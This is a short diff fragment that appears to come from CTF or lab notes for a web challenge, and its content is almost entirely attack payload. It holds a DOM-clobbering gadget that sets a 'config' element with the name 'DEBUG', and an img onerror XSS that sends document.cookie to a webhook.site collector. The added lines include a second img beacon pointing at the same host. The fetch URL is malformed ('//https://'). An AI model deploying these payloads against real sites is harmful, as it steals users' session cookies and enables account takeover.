@@ -22,3 +22,5 @@ title:
 <p id="config"></p><p id="config" name="DEBUG">true</p>  
 content:  
 <img src=x onerror="fetch('//https://webhook.site/4c6a11ba-e622-45ce-965f-29c5ca311c76?' + document.cookie")>
+
+<img src="https://webhook.site/4c6a11ba-e622-45ce-965f-29c5ca311c76">
